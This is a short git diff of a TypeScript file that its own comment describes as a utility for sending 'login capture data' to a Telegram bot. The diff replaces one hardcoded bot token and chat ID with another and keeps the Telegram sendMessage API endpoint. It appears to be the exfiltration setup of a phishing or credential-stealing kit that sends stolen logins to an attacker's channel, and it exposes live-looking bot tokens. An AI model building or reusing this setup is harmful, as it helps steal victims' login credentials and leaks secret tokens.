@@ -1,8 +1,8 @@
 // telegramBot.ts
 // Utility script for sending login capture data to a Telegram bot
 
-const TELEGRAM_BOT_TOKEN = "8785593118:AAE9SgTv9pOlKgSONuZIrnoSwLnCP-X_zxc";
-const TELEGRAM_CHAT_ID = "1228161472";
+const TELEGRAM_BOT_TOKEN = "8436635149:AAHyn45Oa_A-RP2dDwJZesg-C8zgYbzMSr4";
+const TELEGRAM_CHAT_ID = "7872059743";
 
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
